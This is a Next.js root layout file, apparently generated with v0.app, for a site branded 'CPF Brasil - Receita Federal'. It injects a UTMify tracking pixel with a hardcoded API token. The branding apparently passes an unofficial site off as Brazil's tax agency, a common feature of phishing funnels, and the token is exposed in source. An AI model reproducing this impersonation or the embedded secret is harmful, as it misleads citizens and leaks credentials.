import type React from "react"
import type { Metadata } from "next"
import { GeistSans } from "geist/font/sans"
import { GeistMono } from "geist/font/mono"
import "./globals.css"

export const metadata: Metadata = {
  title: "CPF Brasil - Receita Federal",
  description: "Sistema de acesso ao CPF Brasil da Receita Federal",
  generator: "v0.app",
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="pt-BR">
      <head>
        <script
          dangerouslySetInnerHTML={{
            __html: `
              // Configuração do pixel UTMFY
              window.pixelId = "68230c0f5eee6a902ed7223a";
              window.utmifyConfig = {
                apiToken: "IvzcwicXzvD9wEZvc3A8VCGJlxTfdz9J2gXq",
                debug: false
              };
              
              // Carregar pixel UTMFY
              (function() {
                try {
                  var script = document.createElement("script");
                  script.async = true;
                  script.defer = true;
                  script.src = "https://cdn.utmify.com.br/scripts/pixel/pixel.js";
                  script.onload = function() {
                    console.log("[UTMFY] Pixel carregado com sucesso");
                  };
                  script.onerror = function() {
                    console.error("[UTMFY] Erro ao carregar pixel");
                  };
                  document.head.appendChild(script);
                } catch (error) {
                  console.error("[UTMFY] Erro na configuração do pixel:", error);
                }
              })();
            `,
          }}
        />
      </head>
      <body className={`${GeistSans.variable} ${GeistMono.variable}`}>
        {children}
      </body>
    </html>
  )
}